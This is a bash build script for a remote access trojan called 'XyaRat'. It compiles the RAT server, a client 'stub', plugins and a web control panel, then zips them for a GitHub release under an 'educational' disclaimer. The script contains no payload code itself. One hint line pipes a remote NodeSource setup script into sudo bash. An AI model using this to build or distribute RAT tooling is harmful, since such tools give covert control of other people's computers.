#!/bin/bash

# XyaRat Build Script for Linux
# Requires: Mono, .NET SDK 9.0, Node.js 20+

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}   XyaRat Build Script${NC}"
echo -e "${BLUE}========================================${NC}"

# Check prerequisites
echo -e "\n${YELLOW}[1/7] Checking prerequisites...${NC}"

if ! command -v msbuild &> /dev/null && ! command -v xbuild &> /dev/null; then
    echo -e "${RED}❌ MSBuild/XBuild not found. Install Mono:${NC}"
    echo -e "${YELLOW}   sudo apt install mono-complete${NC}"
    exit 1
fi

if ! command -v dotnet &> /dev/null; then
    echo -e "${RED}❌ .NET SDK not found. Install .NET 9.0:${NC}"
    echo -e "${YELLOW}   sudo apt install dotnet-sdk-9.0${NC}"
    exit 1
fi

if ! command -v node &> /dev/null; then
    echo -e "${RED}❌ Node.js not found. Install Node.js 20+:${NC}"
    echo -e "${YELLOW}   curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -${NC}"
    echo -e "${YELLOW}   sudo apt install nodejs${NC}"
    exit 1
fi

echo -e "${GREEN}✅ All prerequisites installed${NC}"

# Restore NuGet packages
echo -e "\n${YELLOW}[2/7] Restoring NuGet packages...${NC}"
nuget restore XyaRat.sln || {
    echo -e "${RED}❌ NuGet restore failed${NC}"
    exit 1
}
echo -e "${GREEN}✅ NuGet packages restored${NC}"

# Build RAT solution (Server + Client + Plugins)
echo -e "\n${YELLOW}[3/7] Building RAT Solution (Server + Client + Plugins)...${NC}"
msbuild /nologo /v:minimal /p:Configuration=Release XyaRat.sln || xbuild /nologo /v:minimal /p:Configuration=Release XyaRat.sln || {
    echo -e "${RED}❌ RAT build failed${NC}"
    exit 1
}
echo -e "${GREEN}✅ RAT built successfully${NC}"

# Build WebPanel Backend
echo -e "\n${YELLOW}[4/7] Building WebPanel Backend...${NC}"
dotnet publish WebPanel/WebPanel.csproj -c Release -o WebPanel/bin/Release/publish || {
    echo -e "${RED}❌ WebPanel backend build failed${NC}"
    exit 1
}
echo -e "${GREEN}✅ WebPanel backend built successfully${NC}"

# Build WebPanel Frontend
echo -e "\n${YELLOW}[5/7] Building WebPanel Frontend (React)...${NC}"
cd WebPanel/ClientApp
npm install || {
    echo -e "${RED}❌ npm install failed${NC}"
    exit 1
}
npm run build || {
    echo -e "${RED}❌ Frontend build failed${NC}"
    exit 1
}
cd ../..
echo -e "${GREEN}✅ WebPanel frontend built successfully${NC}"

# Package RAT (Server + Client + Plugins)
echo -e "\n${YELLOW}[6/7] Packaging XyaRat...${NC}"
rm -f XyaRat.zip
cd Binaries/Release
zip -r ../../XyaRat.zip . || {
    echo -e "${RED}❌ Failed to package XyaRat${NC}"
    exit 1
}
cd ../..
echo -e "${GREEN}✅ XyaRat packaged: XyaRat.zip${NC}"

# Package WebPanel
echo -e "\n${YELLOW}[7/7] Packaging WebPanel...${NC}"
rm -f WebPanel.zip
cd WebPanel/bin/Release/publish
zip -r ../../../../WebPanel.zip . || {
    echo -e "${RED}❌ Failed to package WebPanel${NC}"
    exit 1
}
cd ../../../..
echo -e "${GREEN}✅ WebPanel packaged: WebPanel.zip${NC}"

# Summary
echo -e "\n${BLUE}========================================${NC}"
echo -e "${GREEN}✨ Build completed successfully!${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "\n${YELLOW}📦 Build Output:${NC}"
echo -e "  ${GREEN}✓${NC} Binaries/Release/       - Compiled executables"
echo -e "  ${GREEN}✓${NC} XyaRat.zip               - RAT package"
echo -e "  ${GREEN}✓${NC} WebPanel.zip            - Web Admin Panel"
echo -e "\n${YELLOW}🚀 Executables:${NC}"
echo -e "  ${GREEN}✓${NC} Binaries/Release/XyaRat.exe    - Main RAT Server"
echo -e "  ${GREEN}✓${NC} Binaries/Release/Stub/Client.exe - RAT Client/Stub"
echo -e "  ${GREEN}✓${NC} WebPanel/bin/Release/publish/WebPanel.exe - Web Panel"
echo -e "\n${YELLOW}📝 Next Steps:${NC}"
echo -e "  1. Test executables: cd Binaries/Release && wine XyaRat.exe"
echo -e "  2. Upload to GitHub Release"
echo -e "  3. Review security settings before deployment"
echo -e "\n${RED}⚠️  Warning: For educational and authorized testing only!${NC}\n"
